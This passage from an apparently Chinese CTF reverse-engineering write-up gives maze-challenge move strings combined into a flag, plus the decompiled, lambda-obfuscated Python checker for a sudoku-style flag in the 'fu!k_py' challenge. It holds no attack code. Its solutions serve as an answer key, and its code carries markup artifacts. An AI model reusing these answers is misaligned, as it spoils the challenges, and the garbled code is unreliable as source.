class="hljs-string">………s</span>|||</span><br><span class="line"></span><br><span class="line">||<span class="hljs-string">.</span>||||||||||||</span><br><span class="line"></span><br><span class="line">||<span class="hljs-string">.</span>||||||||||||</span><br><span class="line"></span><br><span class="line">||<span class="hljs-string">.</span>||||||||||||</span><br><span class="line"></span><br><span class="line">||<span class="hljs-string">.</span>||||||||||||</span><br><span class="line"></span><br><span class="line">||<span class="hljs-string">.</span>||||||||||||</span><br><span class="line"></span><br><span class="line">||<span class="hljs-string">.</span>||||||||||||</span><br><span class="line"></span><br><span class="line">||<span class="hljs-string">………d</span>|||</span><br><span class="line"></span><br><span class="line">|||||||||||||||</span><br></pre></td></tr></tbody></table></figure><p>start (1,B) a2=3</p><p>aaaaaaaaasssssssddddddddd</p><p>len=25</p><figure class="highlight gherkin hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">maze4</span><br><span class="line"></span><br><span class="line">|||||||||||||||</span><br><span class="line"></span><br><span class="line">|||||||||||||||</span><br><span class="line"></span><br><span class="line">|||||||||||||||</span><br><span class="line"></span><br><span class="line">|||<span class="hljs-string">……….</span>||</span><br><span class="line"></span><br><span class="line">|||<span class="hljs-string">.</span>||||||||<span class="hljs-string">.</span>||</span><br><span class="line"></span><br><span class="line">|||<span class="hljs-string">.</span>||||||||<span class="hljs-string">.</span>||</span><br><span class="line"></span><br><span class="line">|||<span class="hljs-string">.</span>||||||||<span class="hljs-string">.</span>||</span><br><span class="line"></span><br><span class="line">|||<span class="hljs-string">.</span>||||||||<span class="hljs-string">.</span>||</span><br><span class="line"></span><br><span class="line">|||<span class="hljs-string">s</span>||||||||<span class="hljs-string">d</span>||</span><br><span class="line"></span><br><span class="line">|||||||||||||||</span><br></pre></td></tr></tbody></table></figure><p>start (8,3) a2=4</p><p>wwwwwdddddddddsssss</p><p>len=19</p><p>长度顺序为19 25 26 28，所以对应的结果如下：</p><p>4312-wwwwwdddddddddsssss-aaaaaaaaasssssssddddddddd-dddddddddsssssaaaaaaaaawww-sdsdsdsdsdsdsddwdwdwdwdwdwdw</p><p>套上flag即可</p><h2 id="fu-k-py"><a href="#fu-k-py" class="headerlink" title="fu!k_py"></a>fu!k_py</h2><p>这题也比较简单，没什么好说的，解压得到的pyc文件没有任何修改，可以直接uncompyle</p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">(<span class="hljs-keyword">lambda</span> __g, __<span class="hljs-built_in">print</span>: [ [ (<span class="hljs-keyword">lambda</span> __after: [ (<span class="hljs-keyword">lambda</span> __after: (__<span class="hljs-built_in">print</span>(<span class="hljs-string">'Error len!'</span>), (exit(), __after())[<span class="hljs-number">1</span>])[<span class="hljs-number">1</span>] <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(<span class="hljs-built_in">input</span>) != <span class="hljs-number">87</span> <span class="hljs-keyword">else</span> __after())(<span class="hljs-keyword">lambda</span> : [ [ [ [ (<span class="hljs-keyword">lambda</span> __after: (__<span class="hljs-built_in">print</span>(<span class="hljs-string">'Error fmt!'</span>), (exit(<span class="hljs-number">0</span>), __after())[<span class="hljs-number">1</span>])[<span class="hljs-number">1</span>] <span class="hljs-keyword">if</span> fmt1 != <span class="hljs-string">'flag{'</span> <span class="hljs-keyword">or</span> fmt2 != <span class="hljs-string">'}'</span> <span class="hljs-keyword">else</span> __after())(<span class="hljs-keyword">lambda</span> : (d.append(context[<span class="hljs-number">0</span>:<span class="hljs-number">9</span>]), (d.append(context[<span class="hljs-number">9</span>:<span class="hljs-number">18</span>]), (d.append(context[<span class="hljs-number">18</span>:<span class="hljs-number">27</span>]), (d.append(context[<span class="hljs-number">27</span>:<span class="hljs-number">36</span>]), (d.append(context[<span class="hljs-number">36</span>:<span class="hljs-number">45</span>]), (d.append(context[<span class="hljs-number">45</span>:<span class="hljs-number">54</span>]), (d.append(context[<span class="hljs-number">54</span>:<span class="hljs-number">63</span>]), (d.append(context[<span class="hljs-number">63</span>:<span class="hljs-number">72</span>]), (d.append(context[<span class="hljs-number">72</span>:<span class="hljs-number">81</span>]), [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ (<span class="hljs-keyword">lambda</span> __after: (__<span class="hljs-built_in">print</span>(<span class="hljs-string">'Error!'</span>), (exit(), __after())[<span class="hljs-number">1</span>])[<span class="hljs-number">1</span>] <span class="hljs-keyword">if</span> d[<span class="hljs-number">0</span>][<span class="hljs-number">2</span>] != <span class="hljs-string">'5'</span> <span class="hljs-keyword">or</span> d[<span class="hljs-number">0</span>][<span class="hljs-number">3</span>] != <span class="hljs-string">'3'</span> <span class="hljs-keyword">else</span> __after())(<span class="hljs-keyword">lambda</span> : (<span class="hljs-keyword">lambda</span> __after: (__<span class="hljs-built_in">print</span>(<span class="hljs-string">'Error!'</span>), (exit(), __after())[<span class="hljs-number">1</span>])[<span class="hljs-number">1</span>] <span class="hljs-keyword">if</span> d[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>] != <span class="hljs-string">'8'</span> <span class="hljs-keyword">or</span> d[<span class="hljs-number">1</span>][<span class="hljs-number">7</span>] != <span class="hljs-string">'2'</span> <span class="hljs-keyword">else</span> __after())(<span class="hljs-keyword">lambda</span> : (<span class="hljs-keyword">lambda</span> __after: (__<span class="hljs-built_in">print</span>(<span class="hljs-string">'Error!'</span>), (exit(), __after())[<span class="hljs-number">1</span>])[<span class="hljs-number">1</span>] <span class="hljs-keyword">if</span> d[<span class="hljs-number">2</span>][<span class="hljs-number">1</span>] != <span class="hljs-string">'7'</span> <span class="hljs-keyword">or</span> d[<span class="hljs-number">2</span>][<span class="hljs-number">4</span>] != <span class="hljs-string">'1'</span> <span class="hljs-keyword">or</span> d[<span class="hljs-number">2</span>][<span class="hljs-number">6</span>] != <span class="hljs-string">'5'</span> <span class="hljs-keyword">else</span> __after())(<span class="hljs-keyword">lambda</span> : (<span class="hljs-keyword">lambda</span> __after: (__<span class="hljs-built_in">print</span>(<span class="hljs-string">'Error!'</span>), (exit(), __after())[<span class="hljs-number">1</span>])[<span class="hljs-number">1</span>] <span class="hljs-keyword">if</span> d[<span class="hljs-number">3</span>][<span class="hljs-number">0</span>] != <span class="hljs-string">'4'</span> <span class="hljs-keyword">or</span> d[<span class="hljs-number">3</span>][<span class="hljs-number">5</span>] != <span class="hljs-string">'5'</span> <span class="hljs-keyword">or</span> d[<span class="hljs-number">3</span>][<span class="hljs-number">6</span>] != <span class="hljs-string">'3'</span> <span class="hljs-keyword">else</span> __after())(<span class="hljs-keyword">lambda</span> : (<span class="hljs-keyword">lambda</span> __after: (__<span class="hljs-built_in">print</span>(<span class="hljs-string">'Error!'</span>), (exit(), __after())[<span class="hljs-number">1</span>])[<span class="hljs-number">1</span>] <span class="hljs-keyword">if</span> d[<span class="hljs-number">4</span>][<span class="hljs-number">1</span>] != <span class="hljs-string">'1'</span> <span class="hljs-keyword">or</span> d[<span class="hljs-number">4</span>][<span class="hljs-number">4</span>] != <span class="hljs-string">'7'</span> <span class="hljs-keyword">or</span> d[<span class="hljs-number">4</span>][<span class="hljs-number">8</span>] != <span class="hljs-string">'6'</span> <span class="hljs-keyword">else</span> __after())(<span class="hljs-keyword">lambda</span> : (<span class="hljs-keyword">lambda</span> __after: (__<span class="hljs-built_in">print</span>(<span class="hljs-string">'Error!'</span>), (exit(), __after())[<span class="hljs-number">1</span>])[<span class="hljs-number">1</span>] <span class="hljs-keyword">if</span> d[<span class="hljs-number">5</span>][<span class="hljs-number">2</span>] != <span class="hljs-string">'3'</span> <span class="hljs-keyword">or</span> d[<span class="hljs-number">5</span>][<span class="hljs-number">3</span>] != <span class="hljs-string">'2'</span> <span class="hljs-keyword">or</span> d[<span class="hljs-number">5</span>][<span class="hljs-number">7</span>] != <span class="hljs-string">'8'</span> <span class="hljs-keyword">else</span> __after())(<span class="hljs-keyword">lambda</span> : (<span class="hljs-keyword">lambda</span> __after: (__<span class="hljs-built_in">print</span>(<span class="hljs-string">'Error!'</span>), (exit(), __after())[<span class="hljs-number">1</span>])[<span class="hljs-number">1</span>] <span class="hljs-keyword">if</span> d[<span class="hljs-number">6</span>][<span class="hljs-number">1</span>] != <span class="hljs-string">'6'</span> <span class="hljs-keyword">or</span> d[<span class="hljs-number">6</span>][<span class="hljs-number">3</span>] != <span class="hljs-string">'5'</span> <span class="hljs-keyword">or</span> d[<span class="hljs-number">6</span>][<span class="hljs-number">8</span>] != <span class="hljs-string">'9'</span> <span class="hljs-keyword">else</span> __after())(<span class="hljs-keyword">lambda</span> : (<span class="hljs-keyword">lambda</span> __after: (__<span class="hljs-built_in">print</span>(<span class="hljs-string">'Error!'</span>), (exit(), __after())[<span class="hljs-number">1</span>])[<span class="hljs-number">1</span>] <span class="hljs-keyword">if</span> d[<span class="hljs-number">7</span>][<span class="hljs-number">2</span>] != <span class="hljs-string">'4'</span> <span class="hljs-keyword">or</span> d[<span class="hljs-number">7</span>][<span class="hljs-number">7</span>] != <span class="hljs-string">'3'</span> <span class="hljs-keyword">else</span> __after())(<span class="hljs-keyword">lambda</span> : (<span class="hljs-keyword">lambda</span> __after: (__<span class="hljs-built_in">print</span>(<span class="hljs-string">'Error!'</span>), (exit(), __after())[<span class="hljs-number">1</span>])[<span class="hljs-number">1</span>] <span class="hljs-keyword">if</span> d[<span class="hljs-number">8</span>][<span class="hljs-number">5</span>] != <span class="hljs-string">'9'</span> <span class="hljs-keyword">or</span> d[<span class="hljs-number">8</span>][<span class="hljs-number">6</span>] != <span class="hljs-string">'7'</span> <span class="hljs-keyword">else</span> __after())(<span class="hljs-keyword">lambda</span> : (<span class="hljs-keyword">lambda</span> __after: (__<span class="hljs-built_in">print</span>(<span class="hljs-string">'Error!'</span>), (exit(), __after())[<span class="hljs-number">1</span>])[<span class="hljs-number">1</span>] <span class="hljs-keyword">if</span> check(h1) != <span class="hljs-number">45</span> <span class="hljs-keyword">or</span> check(h2) != <span class="hljs-number">45</span> <span class="hljs-keyword">or</span> check(h3) != <span class="hljs-number">45</span> <span class="hljs-keyword">or</span> check(h4) != <span class="hljs-number">45</span> <span class="hljs-keyword">or</span> check(h5) != <span class="hljs-number">45</span> <span class="hljs-keyword">or</span> check(h6) != <span class="hljs-number">45</span> <span class="hljs-keyword">or</span> check(h7) != <span class="hljs-number">45</span> <span class="hljs-keyword">or</span> check(h8) != <span class="hljs-number">45</span> <span class="hljs-keyword">or</span> check(h9) != <span class="hljs-number">45</span> <span class="hljs-keyword">else</span> __after())(<span class="hljs-keyword">lambda</span> : (<span class="hljs-keyword">lambda</span> __after: (__<span class="hljs-built_in">print</span>(<span class="hljs-string">'Error!'</span>), (exit(), __after())[<span class="hljs-number">1</span>])[<span class="hljs-number">1</span>] <span class="hljs-keyword">if</span> check(l1) != <span class="hljs-number">45</span> <span class="hljs-keyword">or</span> check(l2) != <span class="hljs-number">45</span> <span class="hljs-keyword">or</span> check(l3) != <span class="hljs-number">45</span> <span class="hljs-keyword">or</span> check(l4) != <span class="hljs-number">45</span> <span class="hljs-keyword">or</span> check(l5) != <span class="hljs-number">45</span> <span class="hljs-keyword">or</span> check(l6) != <span class="hljs-number">45</span> <span class="hljs-keyword">or</span> check(l7) != <span class="hljs-number">45</span> <span class="hljs-keyword">or</span> check(l8) != <span class="hljs-number">45</span> <span class="hljs-keyword">or</span> check(l9) != <span class="hljs-number">45</span> <span class="hljs-keyword">else</span> __after())(<span class="hljs-keyword">lambda</span> : (<span class="hljs-keyword">lambda</span> __after: (__<span class="hljs-built_in">print</span>(<span class="hljs-string">'Error!'</span>), (exit(), __after())[<span class="hljs-number">1</span>])[<span class="hljs-number">1</span>] <span class="hljs-keyword">if</span> check(k1) != <span class="hljs-number">45</span> <span class="hljs-keyword">or</span> check(k2) != <span class="hljs-number">45</span> <span class="hljs-keyword">or</span> check(k3) != <span class="hljs-number">45</span> <span class="hljs-keyword">or</span> check(k4) != <span class="hljs-number">45</span> <span class="hljs-keyword">or</span> check(k5) != <span class="hljs-number">45</span> <span class="hljs-keyword">or</span> check(k6) != <span class="hljs-number">45</span> <span class="hljs-keyword">or</span> check(k7) != <span class="hljs-number">45</span> <span class="hljs-keyword">or</span> check(k8) != <span class="hljs-number">45</span> <span class="hljs-keyword">or</span> check(k9) != <span class="hljs-number">45</span> <span class="hljs-keyword">else</span> __after())(<span class="hljs-keyword">lambda</span> : (<span class="hljs-keyword">lambda</span> __after: (__<span class="hljs-built_in">print</span>(<span class="hljs-string">'Error!'</span>), (exit(), __after())[<span class="hljs-number">1</span>])[<span class="hljs-number">1</span>] <span class="hljs-keyword">if</span> check1(h1) != <span class="hljs-number">1</span> <span class="hljs-keyword">or</span> check1(h2) != <span class="hljs-number">1</span> <span class="hljs-keyword">or</span> check1(h3) != <span class="hljs-number">1</span> <span class="hljs-keyword">or</span> check1(h4) != <span class="hljs-number">1</span> <span class="hljs-keyword">or</span> check1(h5) != <span class="hljs-number">1</span> <span class="hljs-keyword">or</span> check1(h6) != <span class="hljs-number">1</span> <span class="hljs-keyword">or</span> check1(h7) != <span class="hljs-number">1</span> <span class="hljs-keyword">or</span> check1(h8) != <span class="hljs-number">1</span> <span class="hljs-keyword">or</span> check1(h9) != <span class="hljs-number">1</span> <span class="hljs-keyword">else</span> __after())(<span class="hljs-keyword">lambda</span> : (<span class="hljs-keyword">lambda</span> __after: (__<span class="hljs-built_in">print</span>(<span class="hljs-string">'Error!'</span>), (exit(), __after())[<span class="hljs-number">1</span>])[<span class="hljs-number">1</span>] <span class="hljs-keyword">if</span> check1(l1) != <span class="hljs-number">1</span> <span class="hljs-keyword">or</span> check1(l2) != <span class="hljs-number">1</span> <span class="hljs-keyword">or</span> check1(l3) != <span class="hljs-number">1</span> <span class="hljs-keyword">or</span> check1(l4) != <span class="hljs-number">1</span> <span class="hljs-keyword">or</span> check1(l5) != <span class="hljs-number">1</span> <span class="hljs-keyword">or</span> check1(l6) != <span class="hljs-number">1</span> <span class="hljs-keyword">or</span> check1(l7) != <span class="hljs-number">1</span> <span class="hljs-keyword">or</span> check1(l8) != <span class="hljs-number">1</span> <span class="hljs-keyword">or</span> check1(l9) != <span class="hljs-number">1</span> <span class="hljs-keyword">else</span> __after())(<span class="hljs-keyword">lambda</span> : (<span class="hljs-keyword">lambda</span> __after: (__<span class="hljs-built_in">print</span>(<span class="hljs-string">'Error!'</span>), (exit(), __after())[<span class="hljs-number">1</span>])[<span class="hljs-number">1</span>] <span class="hljs-keyword">if</span> check1(k1) != <span class="hljs-number">1</span> <span class="hljs-keyword">or</span> check1(k2) != <span class="hljs-number">1</span> <span class="hljs-keyword">or</span> check1(k3) != <span class="hljs-number">1</span> <span class="hljs-keyword">or</span> check1(k4) != <span class="hljs-number">1</span> <span class="hljs-keyword">or</span> check1(k5) != <span class="hljs-number">1</span> <span class="hljs-keyword">or</span> check1(k6) != <span class="hljs-number">1</span> <span class="hljs-keyword">or</span> check1(k7) != <span class="hljs-number">1</span> <span class="hljs-keyword">or</span> check1(k8) != <span class="hljs-number">1</span> <span class="hljs-keyword">or</span> check1(k9) != <span class="hljs-number">1</span> <span class="hljs-keyword">else</span> __after())(<span class="hljs-keyword">lambda</span> : (__<span class="hljs-built_in">print</span>(<span class="hljs-string">'Yes! You got it!'</span>), __after())[<span class="hljs-number">1</span>]))))))))))))))) </span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">for</span> __g[<span class="hljs-string">'k9'</span>] <span class="hljs-keyword">in</span> [context[<span class="hljs-number">60</span>] + context[<span class="hljs-number">61</span>] + context[<span class="hljs-number">62</span>] + context[<span class="hljs-number">69</span>] + context[<span class="hljs-number">70</span>] + context[<span class="hljs-number">71</span>] + context[<span class="hljs-number">78</span>] + context[<span class="hljs-number">79</span>] + context[<span class="hljs-number">80</span>]] ][<span class="hljs-number">0</span>] </span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">for</span> __g[<span class="hljs-string">'k8'</span>] <span class="hljs-keyword">in</span> [context[<span class="hljs-number">57</span>] + context[<span class="hljs-number">58</span>] + context[<span class="hljs-number">59</span>] + context[<span class="hljs-number">66</span>] + context[<span class="hljs-number">67</span>] + context[<span class="hljs-number">68</span>] + context[<span class="hljs-number">75</span>] + context[<span class="hljs-number">76</span>] + context[<span class="hljs-number">77</span>]] ][<span class="hljs-number">0</span>] </span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">for</span> __g[<span class="hljs-string">'k7'</span>] <span class="hljs-keyword">in</span> [context[<span class="hljs-number">54</span>] + context[<span class="hljs-number">55</span>] + context[<span class="hljs-number">56</span>] + context[<span class="hljs-number">63</span>] + context[<span class="hljs-number">64</span>] + context[<span class="hljs-number">65</span>] + context[<span class="hljs-number">72</span>] + context[<span class="hljs-number">73</span>] + context[<span class="hljs-number">74</span>]] ][<span class="hljs-number">0</span>] </span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">for</span> __g[<span class="hljs-string">'k6'</span>] <span class="hljs-keyword">in</span> [context[<span class="hljs-number">33</span>] + context[<span class="hljs-number">34</span>] + context[<span class="hljs-number">35</span>] + context[<span class="hljs-number">42</span>] + context[<span class="hljs-number">43</span>] + context[<span class="hljs-number">44</span>] + context[<span class="hljs-number">51</span>] + context[<span class="hljs-number">52</span>] + context[<span class="hljs-number">53</span>]] ][<span class="hljs-number">0</span>] </span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">for</span> __g[<span class="hljs-string">'k5'</span>] <span class="hljs-keyword">in</span> [context[<span class="hljs-number">30</span>] + context[<span class="hljs-number">31</span>] + context[<span class="hljs-number">32</span>] + context[<span class="hljs-number">39</span>] + context[<span class="hljs-number">40</span>] + context[<span class="hljs-number">41</span>] + context[<span class="hljs-number">48</span>] + context[<span class="hljs-number">49</span>] + context[<span class="hljs-number">50</span>]] ][<span class="hljs-number">0</span>] </span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">for</span> __g[<span class="hljs-string">'k4'</span>] <span class="hljs-keyword">in</span> [context[<span class="hljs-number">27</span>] + context[<span class="hljs-number">28</span>] + context[<span class="hljs-number">29</span>] + context[<span class="hljs-number">36</span>] + context[<span class="hljs-number">37</span>] + context[<span class="hljs-number">38</span>] + context[<span class="hljs-number">45</span>] + context[<span class="hljs-number">46</span>] + context[<span class="hljs-number">47</span>]] ][<span class="hljs-number">0</span>] </span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">for</span> __g[<span class="hljs-string">'k3'</span>] <span class="hljs-keyword">in</span> [context[<span class="hljs-number">6</span>] + context[<span class="hljs-number">7</span>] + context[<span class="hljs-number">8</span>] + context[<span class="hljs-number">15</span>] + context[<span class="hljs-number">16</span>] + context[<span class="hljs-number">17</span>] + context[<span class="hljs-number">24</span>] + context[<span class="hljs-number">25</span>] + context[<span class="hljs-number">26</span>]] ][<span class="hljs-number">0</span>] </span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">for</span> __g[<span class="hljs-string">'k2'</span>] <span class="hljs-keyword">in</span> [context[<span class="hljs-number">3</span>] + context[<span class="hljs-number">4</span>] + context[<span class="hljs-number">5</span>] + context[<span class="hljs-number">12</span>] + context[<span class="hljs-number">13</span>] + context[<span class="hljs-number">14</span>] + context[<span class="hljs-number">21</span>] + context[<span class="hljs-number">22</span>] + context[<span class="hljs-number">23</span>]] ][<span class="hljs-number">0</span>] </span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">for</span> __g[<span class="hljs-string">'k1'</span>] <span class="hljs-keyword">in</span> [context[<span class="hljs-number">0</span>] + context[<span class="hljs-number">1</span>] + context[<span class="hljs-number">2</span>] + context[<span class="hljs-number">9</span>] + context[<span class="hljs-number">10</span>] + context[<span class="hljs-number">11</span>] + context[<span class="hljs-number">18</span>] + context[<span class="hljs-number">19</span>] + context[<span class="hljs-number">20</span>]] ][<span class="hljs-number">0</span>] </span><br><span class="line"><span class="hljs-keyword">for</span> __g[<span class="hljs-string">'l9'</span>] <span class="hljs-keyword">in</span> [context[<span class="hljs-number">8</span>] + context[<span class="hljs-number">17</span>] + context[<span class="hljs-number">26</span>] + context[<span class="hljs-number">35</span>] + context[<span class="hljs-number">44</span>] + context[<span class="hljs-number">53</span>] + context[<span class="hljs-number">62</span>] + context[<span class="hljs-number">71</span>] + context[<span class="hljs-number">80</span>]] ][<span class="hljs-number">0</span>] </span><br><span class="line"> <span class="hljs-keyword">for</span> __g[<span class="hljs-string">'l8'</span>] <span class="hljs-keyword">in</span> [context[<span class="hljs-number">7</span>] + context[<span class="hljs-number">16</span>] + context[<span class="hljs-number">25</span>] + context[<span class="hljs-number">34</span>] + context[<span class="hljs-number">43</span>] + context[<span class="hljs-number">52</span>] + context[<span class="hljs-number">61</span>] + context[<span class="hljs-number">70</span>] + context[<span class="hljs-number">79</span>]] ][<span class="hljs-number">0</span>] </span><br><span class="line"> <span class="hljs-keyword">for</span> __g[<span class="hljs-string">'l7'</span>] <span class="hljs-keyword">in</span> [context[<span class="hljs-number">6</span>] + context[<span class="hljs-number">15</span>] + context[<span class="hljs-number">24</span>] + context[<span class="hljs-number">33</span>] + context[<span class="hljs-number">42</span>] + context[<span class="hljs-number">51</span>] + context[<span class="hljs-number">60</span>] + context[<span class="hljs-number">69</span>] + context[<span class="hljs-number">78</span>]] ][<span class="hljs-number">0</span>] </span><br><span class="line"> <span class="hljs-keyword">for</span> __g[<span class="hljs-string">'l6'</span>] <span class="hljs-keyword">in</span> [context[<span class="hljs-number">5</span>] + context[<span class="hljs-number">14</span>] + context[<span class="hljs-number">23</span>] + context[<span class="hljs-number">32</span>] + context[<span class="hljs-number">41</span>] + context[<span class="hljs-number">50</span>] + context[<span class="hljs-number">59</span>] + context[<span class="hljs-number">68</span>] + context[<span class="hljs-number">77</span>]] ][<span class="hljs-number">0</span>] </span><br><span class="line"> <span class="hljs-keyword">for</span> __g[<span class="hljs-string">'l5'</span>] <span class="hljs-keyword">in</span> [context[<span class="hljs-number">4</span>] + context[<span class="hljs-number">13</span>] + context[<span class="hljs-number">22</span>] + context[<span class="hljs-number">31</span>] + context[<span class="hljs-number">40</span>] + context[<span class="hljs-number">49</span>] + context[<span class="hljs-number">58</span>] + context[<span class="hljs-number">67</span>] + context[<span class="hljs-number">76</span>]] ][<span class="hljs-number">0</span>] </span><br><span class="line"> <span class="hljs-keyword">for</span> __g[<span class="hljs-string">'l4'</span>] <span class="hljs-keyword">in</span> [context[<span class="hljs-number">3</span>] + context[<span class="hljs-number">12</span>] + context[<span class="hljs-number">21</span>] + context[<span class="hljs-number">30</span>] + context[<span class="hljs-number">39</span>] + context[<span class="hljs-number">48</span>] + context[<span class="hljs-number">57</span>] + context[<span class="hljs-number">66</span>] + context[<span class="hljs-number">75</span>]] ][<span class="hljs-number">0</span>] </span><br><span class="line"> <span class="hljs-keyword">for</span> __g[<span class="hljs-string">'l3'</span>] <span class="hljs-keyword">in</span> [context[<span class="hljs-number">2</span>] + context[<span class="hljs-number">11</span>] + context[<span class="hljs-number">20</span>] + context[<span class="hljs-number">29</span>] + context[<span class="hljs-number">38</span>] + context[<span class="hljs-number">47</span>] + context[<span class="hljs-number">56</span>] + context[<span class="hljs-number">65</span>] + context[<span class="hljs-number">74</span>]] ][<span class="hljs-number">0</span>] </span><br><span class="line"> <span class="hljs-keyword">for</span> __g[<span class="hljs-string">'l2'</span>] <span class="hljs-keyword">in</span> [context[<span class="hljs-number">1</span>] + context[<span class="hljs-number">10</span>] + context[<span class="hljs-number">19</span>] + context[<span class="hljs-number">28</span>] + context[<span class="hljs-number">37</span>] + context[<span class="hljs-number">46</span>] + context[<span class="hljs-number">55</span>] + context[<span class="hljs-number">64</span>] + context[<span class="hljs-number">73</span>]] ][<span class="hljs-number">0</span>] </span><br><span class="line"> <span class="hljs-keyword">for</span> __g[<span class="hljs-string">'l1'</span>] <span class="hljs-keyword">in</span> [context[<span class="hljs-number">0</span>] + context[<span class="hljs-number">9</span>] + context[<span class="hljs-number">18</span>] + context[<span class="hljs-number">27</span>] + context[<span class="hljs-number">36</span>] + context[<span class="hljs-number">45</span>] + context[<span class="hljs-number">54</span>] + context[<span class="hljs-number">63</span>] + context[<span class="hljs-number">72</span>]] ][<span class="hljs-number">0</span>] </span><br><span class="line"> <span class="hljs-keyword">for</span> __g[<span class="hljs-string">'h9'</span>] <span class="hljs-keyword">in</span> [context[<span class="hljs-number">72</span>:<span class="hljs-number">81</span>]] ][<span class="hljs-number">0</span>] </span><br><span class="line"> <span class="hljs-keyword">for</span> __g[<span class="hljs-string">'h8'</span>] <span class="hljs-keyword">in</span> [context[<span class="hljs-number">63</span>:<span class="hljs-number">72</span>]] ][<span class="hljs-number">0</span>] </span><br><span class="line"> <span class="hljs-keyword">for</span> __g[<span class="hljs-string">'h7'</span>] <span class="hljs-keyword">in</span> [context[<span class="hljs-number">54</span>:<span class="hljs-number">63</span>]] ][<span class="hljs-number">0</span>] </span><br><span class="line"> <span class="hljs-keyword">for</span> __g[<span class="hljs-string">'h6'</span>] <span class="hljs-keyword">in</span> [context[<span class="hljs-number">45</span>:<span class="hljs-number">54</span>]] ][<span class="hljs-number">0</span>] </span><br><span class="line"> <span class="hljs-keyword">for</span> __g[<span class="hljs-string">'h5'</span>] <span class="hljs-keyword">in</span> [context[<span class="hljs-number">36</span>:<span class="hljs-number">45</span>]] ][<span class="hljs-number">0</span>] </span><br><span class="line"> <span class="hljs-keyword">for</span> __g[<span class="hljs-string">'h4'</span>] <span class="hljs-keyword">in</span> [context[<span class="hljs-number">27</span>:<span class="hljs-number">36</span>]] ][<span class="hljs-number">0</span>] </span><br><span class="line"> <span class="hljs-keyword">for</span> __g[<span class="hljs-string">'h3'</span>] <span class="hljs-keyword">in</span> [context[<span class="hljs-number">18</span>:<span class="hljs-number">27</span>]] ][<span class="hljs-number">0</span>] </span><br><span class="line"> <span class="hljs-keyword">for</span> __g[<span class="hljs-string">'h2'</span>] <span class="hljs-keyword">in</span> [context[<span class="hljs-number">9</span>:<span class="hljs-number">18</span>]] ][<span class="hljs-number">0</span>] </span><br><span class="line"> <span class="hljs-keyword">for</span> __g[<span class="hljs-string">'h1'</span>] <span class="hljs-keyword">in</span> [context[<span class="hljs-number">0</span>:<span class="hljs-number">9</span>]] ][<span class="hljs-number">0</span>]</span><br><span class="line"> )[<span class="hljs-number">1</span>])[<span class="hljs-number">1</span>])[<span class="hljs-number">1</span>])[<span class="hljs-number">1</span>])[<span class="hljs-number">1</span>])[<span class="hljs-number">1</span>])[<span class="hljs-number">1</span>])[<span class="hljs-number">1</span>])[<span class="hljs-number">1</span>]) </span><br><span class="line"> <span class="hljs-keyword">for</span> **g[<span class="hljs-string">'d'</span>] <span class="hljs-keyword">in</span> [[]] ][<span class="hljs-number">0</span>]  <span class="hljs-keyword">for</span> __g[<span class="hljs-string">'context'</span>] <span class="hljs-keyword">in</span> [<span class="hljs-built_in">input</span>[<span class="hljs-number">5</span>:-<span class="hljs-number">1</span>]] ][<span class="hljs-number">0</span>]  <span class="hljs-keyword">for</span> __g[<span class="hljs-string">'fmt2'</span>] <span class="hljs-keyword">in</span> [<span class="hljs-built_in">input</span>[(-<span class="hljs-number">1</span>)]] ][<span class="hljs-number">0</span>]  <span class="hljs-keyword">for</span> __g[<span class="hljs-string">'fmt1'</span>] <span class="hljs-keyword">in</span> [<span class="hljs-built_in">input</span>[<span class="hljs-number">0</span>:<span class="hljs-number">5</span>]] ][<span class="hljs-number">0</span>])  <span class="hljs-keyword">for</span> __g[<span class="hljs-string">'input'</span>] <span class="hljs-keyword">in</span> [raw_input(<span class="hljs-string">'Input your flag:'</span>)] ][<span class="hljs-number">0</span>] <span class="hljs-keyword">if</span> __name** == <span class="hljs-string">'**main**'</span> <span class="hljs-keyword">else</span> **after())(<span class="hljs-keyword">lambda</span> : <span class="hljs-literal">None</span>)  <span class="hljs-keyword">for</span> __g[<span class="hljs-string">'check1'</span>], check1.__name** <span class="hljs-keyword">in</span> [(<span class="hljs-keyword">lambda</span> arg: (<span class="hljs-keyword">lambda</span> **l: [ (<span class="hljs-keyword">lambda</span> __after: <span class="hljs-number">0</span> <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(<span class="hljs-built_in">list</span>(<span class="hljs-built_in">set</span>(__l[<span class="hljs-string">'arg'</span>]))) != <span class="hljs-number">9</span> <span class="hljs-keyword">else</span> <span class="hljs-number">1</span>)(<span 